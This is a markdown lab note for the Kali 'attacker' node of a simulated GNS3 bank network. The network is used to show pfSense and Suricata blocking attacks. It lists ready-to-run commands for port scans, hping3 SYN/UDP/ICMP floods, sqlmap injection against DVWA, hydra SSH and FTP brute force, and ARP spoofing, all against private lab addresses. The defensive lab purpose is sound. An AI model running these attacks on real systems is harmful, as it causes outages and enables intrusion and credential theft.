# Attacker — Kali Linux
> **GNS3 node:** Attacker | **Console:** VNC
> **IP:** 192.168.122.132/24 | **Gateway:** 192.168.122.2 (Router-1 ether1)
> **Last updated:** 2026-07-04

---

## Interface Setup

```bash
# Check interface name
ip a

# Static IP (if not already set)
sudo ip addr add 192.168.122.132/24 dev eth0
sudo ip route add default via 192.168.122.2

# Verify
ping -c 4 192.168.122.2     # Router-1
ping -c 4 8.8.8.8           # Internet (Router-1 NAT ကိုဖြတ်)
```

---

## Attack Tools (pre-installed on Kali)

### Network Recon
```bash
nmap -sV -O 10.10.10.0/24              # DMZ scan
nmap -sS -p- 10.10.10.10              # bank-web full port scan
traceroute 10.10.10.10                  # hop path verify (R1→R2→pfSense→web)
```

### DDoS / Flood
```bash
hping3 -S --flood -V -p 80 10.10.10.10         # SYN flood
hping3 --udp -p 53 --flood 10.10.10.10         # UDP flood
hping3 -1 --flood 10.10.10.10                   # ICMP flood
```

### Web Attacks
```bash
sqlmap -u "http://10.10.10.10/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session>;security=low" --dbs

nikto -h http://10.10.10.10/DVWA/
```

### SSH Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.20.20.10
```

### FTP Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.20
```

### ARP Spoofing (MITM)
```bash
sudo arpspoof -i eth0 -t 10.10.10.10 192.168.122.2
```

---

## Demo Script (Panel/Judges)

```bash
# 1. Prove real multi-hop path
traceroute 10.10.10.10
# Expected: R1(192.168.122.2) → R2(10.0.12.2) → pfSense(10.0.23.2) → bank-web

# 2. Attack before defense rule
sqlmap -u "http://10.10.10.10/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" ...
# Expected: DB extracted

# 3. Apply pfSense block rule or Suricata fires

# 4. Retry after rule
sqlmap -u "http://10.10.10.10/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" ...
# Expected: timeout / filtered

# 5. Check dashboard → block event visible in real time
```

---

## Status: ⏳ IP setup pending (VM boot check needed)
